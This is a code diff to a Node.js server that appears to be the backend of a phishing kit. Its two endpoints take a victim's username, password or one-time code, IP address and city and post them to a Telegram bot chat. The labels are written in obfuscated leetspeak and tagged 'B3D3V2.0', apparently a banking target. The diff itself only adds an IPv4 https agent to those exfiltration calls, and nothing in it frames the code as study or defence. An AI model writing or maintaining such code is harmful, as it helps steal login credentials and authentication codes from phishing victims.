@@ -3,6 +3,8 @@ const bodyParser = require('body-parser');
 const cors = require('cors'); // Importar cors
 const axios = require('axios');
 const app = express();
+const https = require("https");
+const agent = new https.Agent({ family: 4 });
 
 
 
@@ -33,10 +35,14 @@ app.post('/api/sendMessage', async (req, res) => {
     const message = `🔴B3D3V2.0🔴\nUs4RX: ${user}\nContR: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
-        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-        });
+       const response = await axios.post(
+  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+  {
+    chat_id: CHAT_ID,
+    text: message,
+  },
+  { httpsAgent: agent }
+);
         res.status(200).json({ success: true, data: response.data });
     } catch (error) {
         console.error('Error al enviar mensaje a Telegram:', error);
@@ -55,10 +61,14 @@ app.post('/api/sendMessage2', async (req, res) => {
     const message = `🔐🔴B3D3V2.0🔴\nUs4RX: ${user}\nC0D33: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
-        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-        });
+        const response = await axios.post(
+  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+  {
+    chat_id: CHAT_ID,
+    text: message,
+  },
+  { httpsAgent: agent }
+);
         res.status(200).json({ success: true, data: response.data });
     } catch (error) {
         console.error('Error al enviar mensaje a Telegram:', error);
